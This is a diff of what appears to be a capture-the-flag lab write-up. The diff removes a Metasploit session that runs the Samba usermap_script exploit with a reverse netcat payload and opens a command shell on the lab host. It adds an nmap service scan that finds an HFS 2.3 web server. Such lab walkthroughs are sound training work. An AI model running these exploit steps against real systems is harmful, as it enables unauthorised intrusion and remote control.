@@ -1,54 +1,52 @@
-hippoeug@kali:~$ msfconsole
-                                                  
- _                                                    _
-/ \    /\         __                         _   __  /_/ __
-| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
-| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
-|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
-      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+hippoeug@kali:~$ nmap -sC -sV 10.10.10.8 -Pn -v
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 13:54 +08
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 13:54
+Completed Parallel DNS resolution of 1 host. at 13:54, 0.02s elapsed
+Initiating Connect Scan at 13:54
+Scanning 10.10.10.8 [1000 ports]
+Discovered open port 80/tcp on 10.10.10.8
+Completed Connect Scan at 13:54, 8.18s elapsed (1000 total ports)
+Initiating Service scan at 13:54
+Scanning 1 service on 10.10.10.8
+Completed Service scan at 13:54, 6.12s elapsed (1 service on 1 host)
+NSE: Script scanning 10.10.10.8.
+Initiating NSE at 13:54
+Completed NSE at 13:54, 1.25s elapsed
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.21s elapsed
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Nmap scan report for 10.10.10.8
+Host is up (0.046s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+NSE: Script Post-scanning.
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Initiating NSE at 13:54
+Completed NSE at 13:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
+hippoeug@kali:~$ 
 
-       =[ metasploit v5.0.99-dev                          ]
-+ -- --=[ 2045 exploits - 1106 auxiliary - 344 post       ]
-+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 7 evasion                                       ]
-
-Metasploit tip: Use help <command> to learn more about any command
-
-msf5 > use exploit/multi/samba/usermap_script
-[*] No payload configured, defaulting to cmd/unix/reverse_netcat
-msf5 exploit(multi/samba/usermap_script) > show options
-
-Module options (exploit/multi/samba/usermap_script):
-
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-   RPORT   139              yes       The target port (TCP)
-
-
-Payload options (cmd/unix/reverse_netcat):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.204.129  yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf5 exploit(multi/samba/usermap_script) > set lhost 10.10.14.16
-lhost => 10.10.14.16
-msf5 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
-rhost => 10.10.10.3
-msf5 exploit(multi/samba/usermap_script) > run
-
-[*] Started reverse TCP handler on 10.10.14.16:4444 
-[*] Command shell session 1 opened (10.10.14.16:4444 -> 10.10.10.3:44602) at 2021-01-02 22:39:18 +0800
 
 
